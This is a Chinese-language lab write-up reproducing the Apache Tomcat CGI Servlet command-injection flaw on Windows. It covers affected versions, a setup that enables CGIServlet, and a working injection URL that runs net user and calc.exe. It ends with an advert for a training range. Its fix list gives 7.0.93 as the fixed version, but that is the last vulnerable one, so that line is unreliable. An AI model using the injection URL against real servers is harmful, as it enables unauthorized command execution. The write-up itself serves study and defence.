# **0x00简介**

Tomcat 服务器是一个免费的开放源代码的Web
应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP
程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache
服务器，可利用它响应HTML（标准通用标记语言下的一个应用）页面的访问请求。实际上Tomcat是Apache
服务器的扩展，但运行时它是独立运行的，所以当你运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。

#  **0x01漏洞概述**

该漏洞只对Windows平台有效，攻击者向CGI Servlet发送请求，可在具有Apache
Tomcat权限的系统上注入和执行任意操作系统命令。漏洞成因是当将参数从JRE传递到Windows环境时，由于CGI_Servlet中的输入验证错误而存在该漏洞。

#  **0x02影响范围**

Apache Tomcat 9.0.0.M1 to 9.0.17

Apache Tomcat 8.5.0 to 8.5.39

Apache Tomcat 7.0.0 to 7.0.93

#  **0x03环境搭建**

环境：Java8+Apache Tomcat 8.5.39

1.安装tomcat需要java8环境，jdk下载地址：

https://www.oracle.com/java/technologies/javase-downloads.html

2.下载完成后双击安装，一直点击下一步知道安装完成。

![1611797417_601213a9501d0bb9cc09a.png!small](https://image.3001.net/images/20210128/1611797417_601213a9501d0bb9cc09a.png!small)

2.在系统环境变量中新建JAVA_HOME添加java安装路径，然后在Path变量编辑添加%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin;

![1611797421_601213ad79777887e6931.png!small](https://image.3001.net/images/20210128/1611797421_601213ad79777887e6931.png!small)

![1611797425_601213b10c0c850d068a5.png!small](https://image.3001.net/images/20210128/1611797425_601213b10c0c850d068a5.png!small)

![1611797433_601213b91e8edd9047392.png!small](https://image.3001.net/images/20210128/1611797433_601213b91e8edd9047392.png!small)

3.安装tomcat8.5.39版本，下载地址：

https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.39/bin/

![1611797437_601213bdc3d396e543ac1.png!small](https://image.3001.net/images/20210128/1611797437_601213bdc3d396e543ac1.png!small)

4.下载完成后解压出来配置tomcat，打开Tomcat安装目录的apache-tomcat-8.5.39\conf\web.xml把取消以下两项的注释，否则访问cgi目录会提示404，在默认情况下配置是注释的。

<servlet>

<servlet-name>cgi</servlet-name>

<servlet-class>org.apache.catalina.servlets.CGIServlet</servlet-class>

<init-param>

<param-name>debug</param-name>

<param-value>0</param-value>

</init-param>

<init-param>

<param-name>cgiPathPrefix</param-name>

<param-value>WEB-INF/cgi-bin</param-value>

</init-param>

<init-param>

<param-name>executable</param-name>

<param-value></param-value>

</init-param>

<load-on-startup>5</load-on-startup>

</servlet>

![1611797444_601213c424c70f7cc5e47.png!small](https://image.3001.net/images/20210128/1611797444_601213c424c70f7cc5e47.png!small)

![1611797447_601213c79f388beefef44.png!small](https://image.3001.net/images/20210128/1611797447_601213c79f388beefef44.png!small)

5.然后修改在conf/context.xml中的<Context>添加privileged="true"语句

![1611797450_601213cadf3d2670e2812.png!small](https://image.3001.net/images/20210128/1611797450_601213cadf3d2670e2812.png!small)

6.在apache-tomcat-8.5.39\webapps\ROOT\WEB-INF下创建一个cgi-bin文件夹，并在文件夹内创建一个bat文件写入以下代码

![1611797455_601213cf95ac253e14e30.png!small](https://image.3001.net/images/20210128/1611797455_601213cf95ac253e14e30.png!small)

7.都配置完成后进入apache-tomcat-8.5.39-src\bin下运行startup.bat启动tomcat

![1611797460_601213d483ef6f387c107.png!small](https://image.3001.net/images/20210128/1611797460_601213d483ef6f387c107.png!small)

8.在浏览器输入http://your-ip:8080看到以下页面表示安装成功

![1611797464_601213d8c91d6348b1010.png!small](https://image.3001.net/images/20210128/1611797464_601213d8c91d6348b1010.png!small)

#  **0x04漏洞复现**

1.在浏览器访问http://your-ip/cgi-bin/test.bat?&C%3A%5CWindows%5CSystem32%5Cnet%20user,执行net user 命令

![1611797469_601213ddbcaf37772aaad.png!small](https://image.3001.net/images/20210128/1611797469_601213ddbcaf37772aaad.png!small)

2.把后面的命令修改成calc.exe弹出计算器

![1611797472_601213e0b6de645d43f03.png!small](https://image.3001.net/images/20210128/1611797472_601213e0b6de645d43f03.png!small)

#  **0x05漏洞修复**

建议将受影响版本的用户应该应用下列其中一项缓解。升级到：

Apache Tomcat 9.0.18或更高版本

Apache Tomcat 8.5.40或更高版本

Apache Tomcat 7.0.93或更高版本

在这里，给大家介绍一下“东塔攻防世界靶场”

2020年12月，东塔攻防世界靶场正式对外提供注册，各位小伙伴可通过注册后进行体验。新注册用户可获得一定的积分，对于靶场使用获取正确的Key后，也可以获取一定的经验值，经验值根据排名会不定期给予一定的奖励。

并且，在操作过程中，针对出现的Bug和安全漏洞问题可以和塔塔子提出，审核通过后可以获得相应的奖励积分。

东塔攻防世界网站不定时推出可免费限时使用的靶场，具体可关注东塔网络安全学院推出的一系列活动或添加东塔客服了解详情。

东塔攻防世界靶场主要分为在线靶场和职业体系两大特色板块。且平台内的靶场会定期更新内容，尤其是最新漏洞复现的一些文章和靶场，会优先在靶场中提供环境让大家体验。

东塔攻防世界网站会不定期限时免费推出最新的一些复现的靶场，以供学习交流，给了大家充分体验和使用靶场的机会。

具体可关注东塔网络安全学院推出的一系列活动或添加东塔客服wx（dongtakefu）了解详情。

除了以上介绍的内容，还有更多宝藏区域，更强大的功能，等你来寻宝！

详戳下方“东塔攻防世界靶场”网址，Get一波新世界

https://labs.do-ta.com

